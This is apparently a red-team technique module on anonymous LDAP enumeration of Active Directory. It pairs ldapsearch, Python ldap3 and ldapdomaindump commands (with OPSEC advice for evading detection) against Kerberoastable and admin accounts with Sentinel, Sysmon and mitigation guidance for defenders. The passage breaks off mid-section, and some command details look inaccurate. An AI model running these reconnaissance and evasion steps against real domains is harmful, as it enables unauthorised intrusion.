# REC-AD-002: Anonymous LDAP Binding Domain Extraction

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-002 |
| **Technique Name** | Anonymous LDAP Binding domain extraction |
| **MITRE ATT&CK ID** | T1589.002 – Gather Victim Identity Information: Email Addresses |
| **CVE** | N/A (Legacy feature) |
| **Platform** | Windows Active Directory |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM |
| **Requires Authentication** | No (for RootDSE discovery); Optional (for full enumeration) |
| **Applicable Versions** | Windows Server 2012 R2+ (all AD versions) |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Anonymous LDAP binding domain extraction is a foundational reconnaissance technique leveraging the Lightweight Directory Access Protocol (LDAP) to enumerate Active Directory structure and identity information without authentication. Unlike authenticated attacks, anonymous LDAP queries against properly configured domains can extract critical metadata including domain naming conventions, organizational structure, and in misconfigured environments, comprehensive user and computer listings.

**Threat Profile:** An external or internal attacker with network access to LDAP ports (389, 636, 3268, 3269) can:
- Discover domain structure and naming contexts
- Extract all domain users, computers, and groups (if unauthenticated binds allowed)
- Identify high-privilege accounts and group memberships
- Map organizational units and trust relationships
- Locate vulnerable service accounts and delegated permissions
- Build comprehensive attack graphs (foundational for BloodHound)

**Business Impact:**
- Information disclosure (domain architecture exposed)
- Enablement of targeted phishing (enumerated user list)
- Identification of high-value targets for privilege escalation attacks
- Prerequisite for lateral movement and persistence attacks
- Compliance violations (GDPR Article 32, DORA operational resilience)

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Active Directory structure and LDAP protocol
- Familiarity with LDAP distinguished names (DN) and search filters
- Knowledge of LDAP bind mechanisms (anonymous, null, authenticated)
- Basic understanding of Active Directory object classes (user, computer, group)
- Network protocol fundamentals (TCP/IP, port 389/636 connectivity)

### Required Tools
- **ldapsearch** – Native LDAP query tool (OpenLDAP package)
  - Installation: `sudo apt-get install ldap-utils` (Linux) or included in macOS
  - Cross-platform compatibility
- **Python-ldap3** – Python LDAP library
  - Installation: `pip install ldap3`
  - Enables programmatic LDAP queries
- **Nmap** – Network reconnaissance tool
  - Command: `nmap -p 389,636,3268,3269 -sV --script ldap-rootdse <target>`
- **netcat / nc** – Banner grabbing and port testing
- **PowerShell** – Active Directory module (if internal)
  - `Import-Module ActiveDirectory`

### System Requirements
- Network access to target LDAP server (port 389 or 636)
- No local system access required
- Can be executed from attacker-controlled machine
- Low bandwidth/resource requirements

### Cloud/Environment Considerations
- **On-Premises AD:** Full support (all versions)
- **Hybrid Scenarios:** Azure AD Connect sync may increase enumeration surface
- **Entra ID (Cloud-Only):** LDAP not used; see REC-AD-001 instead
- **AD DS in Azure VMs:** Same as on-premises
- **Multi-domain Forests:** Enumeration scalable across all domains

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Information Gathering Phase

Before executing LDAP enumeration, conduct open-source reconnaissance to establish:

1. **Network Topology Discovery**
   - DNS A records for domain: `nslookup company.com`
   - MX records: `nslookup -query=MX company.com`
   - Identify potential domain controller IPs via DNS SRV records: `nslookup -type=SRV _ldap._tcp.dc._msdcs.company.com`

2. **Target Identification**
   - Locate LDAP-accessible servers: `nmap -p 389,636 -sV --script ldap-rootdse <subnet>`
   - Identify domain controller hostnames
   - Check for LDAPS (636) vs. LDAP (389) availability

3. **Domain Structure Analysis**
   - Company website/public records: identify domain names (company.com, subsidiary.com)
   - LinkedIn company profiles: identify departments and organizational structure
   - WHOIS records: reveal registered domains and organizational boundaries
   - DNS TXT records: SPF, DKIM, DMARC records may hint at infrastructure

### Risk Assessment Before Execution

- **Operational Risk:** Minimal (read-only queries against standard LDAP)
- **Detection Risk:** Medium (if logging enabled; see Section 8)
- **Legal Risk:** Moderate (reconnaissance may violate CFAA depending on authorization)
- **Attribution Risk:** Moderate (LDAP queries from attacker IP visible in logs)

---

## 5. DETAILED EXECUTION

### Method 1: RootDSE Discovery (Anonymous – Always Accessible)

**Objective:** Extract domain structure metadata without authentication.

```bash
# Using ldapsearch - anonymous query to RootDSE
ldapsearch -x -H ldap://10.10.10.100:389 -b "" -s base "(objectclass=*)"

# Expected Output:
# dn:
# objectClass: top
# objectClass: MSAD_Container
# currentTime: 20250101120000.0Z
# subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=company,DC=com
# dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=company,DC=com
# namingContexts: DC=company,DC=com
# namingContexts: CN=Configuration,DC=company,DC=com
# namingContexts: CN=Schema,DC=company,DC=com
# defaultNamingContext: DC=company,DC=com
# schemaNamingContext: CN=Schema,CN=Configuration,DC=company,DC=com
# configurationNamingContext: CN=Configuration,DC=company,DC=com
# rootDomainNamingContext: DC=company,DC=com
# supportedLDAPVersion: 3
# dnsHostName: dc01.company.com
# ldapServiceName: company.com:dc01$
```

**Information Extracted:**
- **defaultNamingContext:** Base DN for domain objects (DC=company,DC=com)
- **dnsHostName:** Domain controller hostname (dc01.company.com)
- **supportedLDAPVersion:** LDAP version support (typically 3)
- **Naming Contexts:** All domain partitions and forest structure

---

### Method 2: Domain User Enumeration (Requires Disabled Security)

**Objective:** Extract all domain user accounts and properties.

```bash
# Query all user objects in domain
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  -f "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName mail displayName userAccountControl

# Or simpler, enumerate just usernames:
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "objectClass=user" sAMAccountName | grep sAMAccountName | awk -F": " '{print $2}'

# Expected Output:
# sAMAccountName: Administrator
# sAMAccountName: Guest
# sAMAccountName: krbtgt
# sAMAccountName: john.smith
# sAMAccountName: jane.doe
# sAMAccountName: db_service
# sAMAccountName: web_admin
# ... (all domain users)
```

**Data Available Per User:**
- sAMAccountName (username)
- displayName (full name)
- mail (email address)
- userAccountControl (account flags, disabled status)
- accountExpires (credential expiration)
- lastLogonTimestamp (last login)
- memberOf (group memberships)
- accountDescription (description/notes)

---

### Method 3: Computer and Service Account Discovery

**Objective:** Extract all domain computers and service accounts.

```bash
# Enumerate all computer objects
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "objectClass=computer" sAMAccountName dNSHostName operatingSystem

# Expected Output:
# sAMAccountName: DC01$
# dNSHostName: dc01.company.com
# operatingSystem: Windows Server 2019 Datacenter
#
# sAMAccountName: WS01$
# dNSHostName: ws01.company.com
# operatingSystem: Windows 10 Enterprise
#
# sAMAccountName: SQL01$
# dNSHostName: sql01.company.com
# operatingSystem: Windows Server 2016 Standard

# Enumerate service accounts (users with service principal names):
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Expected Output:
# sAMAccountName: krbtgt
# servicePrincipalName: kadmin/changepw
#
# sAMAccountName: sql_svc
# servicePrincipalName: MSSQLSvc/sql01.company.com
# servicePrincipalName: MSSQLSvc/sql01.company.com:1433
```

**Data Available Per Computer:**
- sAMAccountName (computer name with $)
- dNSHostName (fully qualified hostname)
- operatingSystem (OS version)
- lastLogonTimestamp (last activity)
- pwdLastSet (password change date)
- servicePrincipalName (services running on computer)

---

### Method 4: Group and Privileged Account Enumeration

**Objective:** Identify high-privilege accounts and group memberships.

```bash
# List all domain groups
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "objectClass=group" sAMAccountName description

# List Domain Admins group members:
ldapsearch -x -H ldap://10.10.10.100:389 -b "CN=Domain Admins,CN=Users,DC=company,DC=com" \
  -s base "objectClass=*" member

# Expected Output:
# member: CN=Administrator,CN=Users,DC=company,DC=com
# member: CN=John Smith,CN=Users,DC=company,DC=com
# member: CN=John Smith2,CN=Users,DC=company,DC=com

# Identify accounts with sensitive permissions (adminCount=1):
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "(adminCount=1)" sAMAccountName displayName adminCount

# Expected Output:
# sAMAccountName: Administrator
# adminCount: 1
#
# sAMAccountName: john.smith
# adminCount: 1
```

---

### Method 5: Organizational Unit and Trust Enumeration

**Objective:** Map domain organizational structure and forest trusts.

```bash
# Enumerate all organizational units:
ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "objectClass=organizationalUnit" ou

# Expected Output:
# ou: Users
# ou: Computers
# ou: Domain Controllers
# ou: Finance
# ou: Engineering
# ou: Sales
# ...

# Enumerate domain trusts (cross-forest, external):
ldapsearch -x -H ldap://10.10.10.100:389 -b "CN=System,DC=company,DC=com" \
  "objectClass=trustedDomain" name trustAttributes trustDirection

# Expected Output:
# name: subsidiary.com
# trustAttributes: TRANSITIVE, WITHIN_FOREST
# trustDirection: BIDIRECTIONAL
```

---

### Method 6: Python-based Enumeration (Programmatic)

**Objective:** Large-scale, automated domain enumeration using Python.

```python
from ldap3 import Server, Connection, ALL

# Connect to domain controller
server = Server('10.10.10.100', get_info=ALL, port=389)
conn = Connection(server)

# Anonymous bind (no credentials)
if conn.bind():
    print("[+] Anonymous bind successful")
    
    # Get root DSE information
    conn.search('', '(objectClass=*)', attributes=['*', '+'])
    for entry in conn.entries:
        print(f"Default Naming Context: {entry.defaultNamingContext}")
        print(f"DNS Hostname: {entry.dnsHostName}")
    
    # Enumerate all users
    conn.search('DC=company,DC=com', '(&(objectClass=user)(objectCategory=person))', 
                attributes=['sAMAccountName', 'mail', 'displayName', 'userAccountControl'])
    
    print(f"\n[+] Found {len(conn.entries)} users:")
    for entry in conn.entries:
        print(f"  {entry.sAMAccountName}: {entry.mail}")
    
    # Enumerate computers
    conn.search('DC=company,DC=com', '(objectClass=computer)',
                attributes=['sAMAccountName', 'dNSHostName', 'operatingSystem'])
    
    print(f"\n[+] Found {len(conn.entries)} computers:")
    for entry in conn.entries:
        print(f"  {entry.sAMAccountName}: {entry.dNSHostName}")
    
    # Enumerate Domain Admins
    conn.search('CN=Domain Admins,CN=Users,DC=company,DC=com', '(objectClass=*)',
                attributes=['member'])
    
    print(f"\n[+] Domain Admins:")
    for entry in conn.entries:
        for member in entry.member:
            print(f"  {member}")
else:
    print("[-] Bind failed")
    print(conn.result)

conn.unbind()
```

---

### Method 7: Bulk Domain Extraction using ldapdomaindump

**Objective:** Complete domain export for offline analysis.

```bash
# Install ldapdomaindump
pip install ldapdomaindump

# Run domain dump (anonymous):
ldapdomaindump -u '' -p '' -d '' 10.10.10.100

# Or with credentials:
ldapdomaindump -u 'COMPANY\username' -p 'password' 10.10.10.100

# Outputs:
# domain_users_by_group.json
# domain_users.json
# domain_computers.json
# domain_groups.json
# domain_policy.json
# domain_trusts.json

# Convert to human-readable format:
cat domain_users.json | jq '.[] | {username: .sAMAccountName, email: .mail, enabled: .userAccountControl}'
```

---

## 6. TOOLS & COMMANDS REFERENCE

### LDAP Enumeration Tools

| Tool | Platform | Authentication | Output | Best For |
|------|----------|----------------|--------|----------|
| **ldapsearch** | Linux/macOS | Anonymous/Auth | Text/LDIF | Quick queries, specific filters |
| **python-ldap3** | Cross-platform | Programmatic | Custom format | Bulk automation, data parsing |
| **BloodHound + SharpHound** | Windows | Authenticated | JSON (graph) | Attack path visualization |
| **ldapdomaindump** | Linux/macOS | Anonymous/Auth | JSON files | Complete domain export |
| **ldeep** | Linux/macOS | Anonymous/Auth | JSON/CSV | Delegations, group policies |
| **netexec** | Linux/macOS | Multi-protocol | Structured output | Multi-domain reconnaissance |
| **PowerView** | Windows | Authenticated | PowerShell objects | Integrated AD enumeration |
| **certipy** | Linux/macOS | Authenticated | JSON | AD Certificate Services |

### Common LDAP Search Filters

```bash
# All users
(objectClass=user)

# All computers
(objectClass=computer)

# All groups
(objectClass=group)

# Enabled users only
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Service accounts (SPN)
(servicePrincipalName=*)

# Admin accounts
(adminCount=1)

# Domain Admins members
(memberOf=CN=Domain Admins,CN=Users,DC=company,DC=com)

# Kerberoastable accounts (SPN, not disabled)
(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# AS-REP roastable accounts (pre-auth disabled)
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Accounts with unconstrained delegation
(userAccountControl:1.2.840.113556.1.4.803:=524288)

# Accounts with resource-based constrained delegation
(msDS-AllowedToActOnBehalfOfOtherIdentity=*)

# Local admin password solution (LAPS) objects
(objectClass=ms-Mcs-AdmPwdExpirationTime)
```

### LDAP Operational Security (OPSEC)

```bash
# Use LDAPS (encrypted) to avoid plaintext monitoring
ldapsearch -H ldaps://10.10.10.100:636 -b "DC=company,DC=com" ...

# Query through VPN/proxy to mask source IP
export HTTP_PROXY=http://proxy.example.com:8080
ldapsearch -H ldap://10.10.10.100:389 ...

# Randomize query patterns to avoid correlation
# Query specific users/groups instead of bulk "objectClass=*"
# Spread queries over time with delays

# Use legitimate tools (native ldapsearch vs. suspicious binaries)

# Query from legitimate-looking source (AD-joined system vs. Kali)
```

---

## 7. ATOMIC TESTS (RED TEAM VALIDATION)

### Test 1: Anonymous Bind Capability Check

**Objective:** Verify ability to bind anonymously to target domain.

**Procedure:**
```bash
ldapsearch -x -H ldap://10.10.10.100:389 -b "" -s base "(objectClass=*)" \
  defaultNamingContext dnsHostName

# Or using python:
python3 << 'EOF'
from ldap3 import Server, Connection
try:
    server = Server('10.10.10.100', port=389)
    conn = Connection(server)
    if conn.bind():
        print("✓ Test PASSED: Anonymous bind successful")
    else:
        print("✗ Test FAILED: Anonymous bind denied")
except Exception as e:
    print(f"✗ Test FAILED: {e}")
EOF
```

**Success Criteria:** Returns RootDSE information (defaultNamingContext, dnsHostName).

### Test 2: User Enumeration

**Objective:** Verify ability to enumerate domain users.

**Procedure:**
```bash
USER_COUNT=$(ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "(&(objectClass=user)(objectCategory=person))" sAMAccountName | grep "sAMAccountName:" | wc -l)

if [ $USER_COUNT -gt 0 ]; then
    echo "✓ Test PASSED: Found $USER_COUNT users"
else
    echo "✗ Test FAILED: No users enumerated"
fi
```

**Success Criteria:** Returns count > 0 of enumerated users.

### Test 3: Service Account Discovery

**Objective:** Verify identification of Kerberoastable accounts.

**Procedure:**
```bash
KERBEROASTABLE=$(ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName servicePrincipalName | grep -c "sAMAccountName:")

if [ $KERBEROASTABLE -gt 0 ]; then
    echo "✓ Test PASSED: Found $KERBEROASTABLE Kerberoastable accounts"
else
    echo "⚠ Test PASSED (Expected): No Kerberoastable accounts found"
fi
```

**Success Criteria:** Returns count of accounts with servicePrincipalName (or zero if hardened).

### Test 4: Privileged Account Detection

**Objective:** Verify identification of high-privilege accounts.

**Procedure:**
```bash
ADMIN_COUNT=$(ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  "(adminCount=1)" sAMAccountName | grep -c "sAMAccountName:")

if [ $ADMIN_COUNT -gt 1 ]; then
    echo "✓ Test PASSED: Found $ADMIN_COUNT admin-equivalent accounts"
else
    echo "✗ Test FAILED: Expected multiple admin accounts"
fi
```

**Success Criteria:** Returns count >= 1 of accounts with adminCount=1.

### Test 5: Domain Functional Level Detection

**Objective:** Verify ability to determine domain capabilities.

**Procedure:**
```bash
DFL=$(ldapsearch -x -H ldap://10.10.10.100:389 -b "DC=company,DC=com" \
  -s base "objectClass=domain" msDS-Behavior-Version | grep "msDS-Behavior-Version" | awk '{print $2}')

case $DFL in
    10) echo "✓ Test PASSED: Domain Functional Level = 2012 R2" ;;
    11) echo "✓ Test PASSED: Domain Functional Level = 2016" ;;
    13) echo "✓ Test PASSED: Domain Functional Level = 2019+" ;;
    *)  echo "⚠ Test PASSED: Domain Functional Level = $DFL" ;;
esac
```

**Success Criteria:** Returns valid DFL version (10, 11, 13, etc.).

---

## 8. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: Suspicious LDAP Query Pattern (Event 1644)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Directory Service logs)
- **Alert Severity:** Medium
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All domain controllers with Event 1644 enabled

**KQL Query:**
```kusto
let timerange = 1h;
let SuspiciousFilters = dynamic([
    "(objectClass=user)",
    "(objectClass=computer)",
    "(objectClass=group)",
    "(adminCount=1)",
    "(servicePrincipalName=*)",
    "(userAccountControl:1.2.840.113556.1.4.803:=2)",
    "(&(objectCategory=person)",
    "(&(objectClass=user)"
]);

SecurityEvent
| where TimeGenerated > ago(timerange)
| where EventID == 1644  // LDAP Query
| extend LdapQueryData = parse_json(EventData)
| extend SearchFilter = tostring(LdapQueryData.SearchFilter)
| where SearchFilter in (SuspiciousFilters) or SearchFilter contains "Domain Admins"
| summarize
    QueryCount = count(),
    UniqueFilters = dcount(SearchFilter),
    FirstQuery = min(TimeGenerated),
    LastQuery = max(TimeGenerated)
    by Computer, SearchFilter
| where QueryCount > 10  // Bulk query threshold
| extend AlertSeverity = "Medium", TechniqueID = "T1589.002"
```

**What This Detects:**
- Bulk LDAP queries searching for users, computers, or groups
- Queries specifically targeting administrative accounts
- Queries for Kerberoastable or AS-REP roastable accounts
- Suspicious search filter combinations

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious LDAP Query Pattern Detection`
   - Severity: `Medium`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group alerts: **By Alert name and Computer**
7. Click **Review + create**

---

### Detection Rule 2: Anonymous LDAP Enumeration (Event ID 4662)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** DCs with SACL configured for "Everyone" group

**KQL Query:**
```kusto
let timerange = 1h;
let HighPrivilegeOUs = dynamic([
    "CN=Domain Admins",
    "CN=Enterprise Admins",
    "CN=Schema Admins",
    "CN=Group Policy Creator Owners"
]);

SecurityEvent
| where TimeGenerated > ago(timerange)
| where EventID == 4662  // Operation performed on object
| extend ObjectName = tostring(EventData.ObjectName)
| extend Properties = tostring(EventData.Properties)
| where ObjectName in (HighPrivilegeOUs) or ObjectName contains "AdminSDHolder"
| extend AccessMask = tostring(EventData.AccessMask)
| where AccessMask contains "ReadProperty" or AccessMask contains "ReadControl"
| summarize
    ReadCount = count(),
    FirstRead = min(TimeGenerated),
    LastRead = max(TimeGenerated),
    DistinctObjects = dcount(ObjectName)
    by Computer, Account, ObjectName
| where ReadCount > 5
| extend AlertSeverity = "High", TechniqueID = "T1589.002"
```

**What This Detects:**
- Bulk reads of high-privilege group properties
- Enumeration of AdminSDHolder container (target for ACL attacks)
- Multiple reads from single source in short timeframe

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID: 1644 (LDAP Query)

**Log Source:** Directory Service (enable in NTDS Diagnostics)

**Trigger:** Any LDAP query to domain controller (when logging enabled)

**Configuration Steps (Enable Logging):**
1. Open **Registry Editor** (regedit.exe)
2. Navigate to: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics`
3. Modify key **"15 LDAP Interface Events"** from 0 to 5
4. Set **"Expensive Search Results Threshold"** to 1 (enable all query logging)
5. Set **"Inefficient Search Result Threshold"** to 1
6. Restart the "Active Directory Domain Services" service (or reboot DC)
7. Verify: Check **Event Viewer** → **Applications and Services Logs** → **Windows Logs** → **Directory Service**

```powershell
# PowerShell equivalent:
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics"
Set-ItemProperty -Path $RegPath -Name "15 LDAP Interface Events" -Value 5
Set-ItemProperty -Path $RegPath -Name "Expensive Search Results Threshold" -Value 1
Set-ItemProperty -Path $RegPath -Name "Inefficient Search Result Threshold" -Value 1

# Restart NTDS service
Restart-Service NTDS -Force
```

**Event 1644 Data Fields:**
- **SearchFilter:** LDAP search filter used (e.g., "(objectClass=user)")
- **SearchScope:** SUBTREE, ONELEVEL, or BASE
- **BaseDN:** Search starting point (e.g., DC=company,DC=com)
- **Attributes:** Requested properties
- **ResultCount:** Number of results returned
- **SearchTime:** Query execution time in milliseconds

**Manual Tuning:**
```powershell
# Create alert for queries returning >1000 results
$Filter = @{
    LogName = 'Directory Service'
    ID = 1644
}
Get-WinEvent -FilterHashtable $Filter | Where-Object {
    $_.Properties[7] -gt 1000  # ResultCount field
}
```

### Event ID: 4662 (Operation Performed on Object)

**Log Source:** Security

**Prerequisite:** SACL configuration on AD objects

**Configuration Steps (Enable SACL):**
1. Open **Active Directory Users and Computers** (dsa.msc)
2. Click **View** → Enable **Advanced Features**
3. Right-click domain root object → **Properties**
4. Go to **Security** tab → **Advanced**
5. Click **Add** → Add SACL for **Everyone** group
6. Select **Read all properties** permission
7. Click **Apply**

```powershell
# PowerShell equivalent (Advanced):
$domain = Get-ADDomain
$domainDN = $domain.DistinguishedName

# Create SACL rule for Everyone group
$ACL = Get-Acl -Path "AD:\$domainDN"
$EveryoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
$ace = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
    $EveryoneSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty,
    [System.Security.AccessControl.AuditFlags]::Success
)
$ACL.AddAuditRule($ace)
Set-Acl -Path "AD:\$domainDN" -AclObject $ACL
```

**Event 4662 Data Fields:**
- **ObjectName:** AD object accessed (CN=..., OU=..., DC=...)
- **OperationType:** Read, Modify, Delete, etc.
- **Properties:** Specific attributes accessed
- **Account:** User/account performing the operation
- **AccessMask:** Type of access (ReadProperty, WriteProperty, etc.)

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10+, Server 2016+

**Sysmon Config Snippet** (for detecting LDAP client activity):

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Capture network connections to LDAP ports (389, 636, 3268, 3269) -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">389</DestinationPort>
      <DestinationPort condition="is">636</DestinationPort>
      <DestinationPort condition="is">3268</DestinationPort>
      <DestinationPort condition="is">3269</DestinationPort>
    </NetworkConnect>
    
    <!-- Capture process creation for known LDAP tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">ldapsearch</CommandLine>
      <CommandLine condition="contains">ldapdomaindump</CommandLine>
      <CommandLine condition="contains">BloodHound</CommandLine>
      <CommandLine condition="contains">SharpHound</CommandLine>
      <CommandLine condition="contains">ldap3</CommandLine>
      <CommandLine condition="contains">netexec</CommandLine>
    </ProcessCreate>
    
    <!-- Capture suspicious PowerShell LDAP queries -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">DirectorySearcher</CommandLine>
      <CommandLine condition="contains">LDAP://</CommandLine>
      <CommandLine condition="contains">Get-ADUser</CommandLine>
      <CommandLine condition="contains">Get-ADComputer</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create configuration file with XML above
3. Install with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64 | Select-Object Status
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[EventData[Data[@Name='DestinationPort'] and (Data='389' or Data='636')]]" | Format-Table TimeCreated, Computer
   ```

---

## 11. MICROSOFT DEFENDER FOR IDENTITY

### Detection Alert: LDAP Reconnaissance via Query Patterns

**Alert Name:** "Reconnaissance activities detected via LDAP queries"
- **Severity:** Medium-to-High (based on filter sophistication)
- **Description:** Detects bulk or suspicious LDAP queries targeting high-privilege groups, service accounts, or administrative objects
- **Applies To:** All domains with Microsoft Defender for Identity enabled
- **Source:** Identity Query Events table (IdentityQueryEvents)

**Manual Configuration Steps (Enable MDI Logging):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your domain
3. Under **Defender for Identity**, ensure **Status = ON**
4. In **Advanced features**, enable **LDAP query logging**
5. Set **LDAP query audit level** to **Informational** or **Detailed**
6. Wait 24 hours for baseline data collection
7. Go to **Advanced Hunting** → **IdentityQueryEvents** table
8. Execute queries to review LDAP activity

**Advanced Hunting Query (Microsoft Defender for Identity):**
```kusto
IdentityQueryEvents
| where ActionType == "LDAP query"
| where TimeGenerated > ago(1h)
| extend QueryDetails = parse_json(Query)
| extend SearchFilter = tostring(QueryDetails.SearchFilter)
| where SearchFilter contains "objectClass=user" or 
        SearchFilter contains "adminCount=1" or
        SearchFilter contains "servicePrincipalName=*"
| summarize QueryCount = count() by Device, QueryDetails, SearchFilter
| where QueryCount > 50
```

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Microsoft Purview does not log LDAP queries directly. Instead, monitor:

### Query: LDAP Binding Events (via Directory Service logs forwarded to Sentinel)

```powershell
# Collect and forward Directory Service logs to Sentinel
# Configure Windows Event Forwarding (WEF) on domain controllers:

# 1. Create Subscription on Central Collector
wecutil cs "LDAP Forwarding Subscription"

# 2. Define query for LDAP events (Event IDs 1644, 4662)
# 3. Forward to Log Analytics Workspace

# Then query in Sentinel/Log Analytics:
SecurityEvent
| where EventID in (1644, 4662)
| where TimeGenerated > ago(24h)
| extend LdapData = parse_json(EventData)
| project TimeGenerated, Computer, Account, EventID, LdapData
```

---

## 13. FALSE POSITIVE ANALYSIS

### Legitimate Activity That Mimics LDAP Enumeration

| Activity | Appears As | Legitimate Reason | How to Distinguish |
|----------|-----------|------------------|-------------------|
| Active Directory synchronization tools | Bulk LDAP queries | Azure AD Connect, Okta sync | Scheduled pattern, service account, predictable filters |
| Backup/recovery operations | User/computer enumeration | Veeam, Commvault, Bacula | Scheduled jobs, consistent scope, backup service account |
| Compliance scanning tools | Extensive property queries | Delinea, Beyondtrust, Nessus | Scheduled scans, known source IPs, audit context |
| Help Desk automation | User lookups | ServiceNow, Jira, Zendesk | Limited filters (specific user search), low volume |
| Security monitoring tools | Authentication queries | Rapid7, CrowdStrike, Qualys | Whitelisted tool binaries, expected patterns |
| Active Directory Replication | RootDSE & schema queries | Inter-DC replication | DC-to-DC traffic, system accounts only |

**Tuning Recommendations:**
```kusto
// Exclude known legitimate LDAP query sources
let WhitelistedAccounts = dynamic(["SYSTEM", "NETWORK SERVICE", "AzureADConnect$", "svc_sync"]);
let WhitelistedComputers = dynamic(["DC01", "DC02", "AADSYNC01"]);
let WhitelistedTools = dynamic(["LdapSyncTool.exe", "ActiveDirectorySync.exe"]);

SecurityEvent
| where EventID == 1644
| where !Account in (WhitelistedAccounts)
| where !Computer in (WhitelistedComputers)
| extend ProcessName = tostring(EventData.ProcessName)
| where ProcessName !in (WhitelistedTools)
// ... rest of detection query
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Disable LDAP Unauthenticated Binds (Server 2019+)**
  - **Applies To:** Windows Server 2019, 2022
  - **Prevents:** Null/empty password LDAP authentication
  
  **Manual Steps (PowerShell):**
  ```powershell
  $RootDSE = Get-ADRootDSE
  $ObjectPath = 'CN=Directory Service,CN=Windows NT,CN=Services,{0}' -f $RootDSE.ConfigurationNamingContext
  Set-ADObject -Identity $ObjectPath -Add @{ 'msDS-Other-Settings' = 'DenyUnauthenticatedBind=1' }
  ```
  
  **Verification:**
  ```powershell
  $RootDSE = Get-ADRootDSE
  $ObjectPath = 'CN=Directory Service,CN=Windows NT,CN=Services,{0}' -f $RootDSE.ConfigurationNamingContext
  Get-ADObject -Identity $ObjectPath -Properties msDS-Other-Settings
  ```
  
  **Impact:** Blocks anonymous user/computer enumeration; RootDSE queries still allowed.

* **Enable LDAP Query Logging (All Versions)**
  - **Applies To:** All domain controllers
  
  **Manual Steps (Registry):**
  1. Open **Registry Editor** on domain controller
  2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics`
  3. Set **"15 LDAP Interface Events"** = 5
  4. Set **"Expensive Search Results Threshold"** = 1
  5. Set **"Inefficient Search Result Threshold"** = 1
  6. Restart Active Directory service
  
  **Manual Steps (PowerShell):**
  ```powershell
  $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics"
  Set-ItemProperty -Path $RegPath -Name "15 LDAP Interface Events" -Value 5
  Set-ItemProperty -Path $RegPath -Name "Expensive Search Results Threshold" -Value 1
  Set-ItemProperty -Path $RegPath -Name "Inefficient Search Result Threshold" -Value 1
  Restart-Service NTDS
  ```

* **Enforce LDAPS (LDAP over SSL/TLS)**
  - **Applies To:** All domain controllers
  
  **Manual Steps:**
  1. Ensure DC has valid SSL certificate (subject = DC FQDN)
  2. Go to **Azure Portal** → **Microsoft Entra ID** (or on-premises AD)
  3. Configure **LDAPS support** to **Enabled**
  4. Test LDAPS connectivity: `nmap -p 636 dc01.company.com -sV`
  5. Require LDAPS in Group Policy: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options** → "LDAP client signing requirements" = **Require signing**

### Priority 2: HIGH

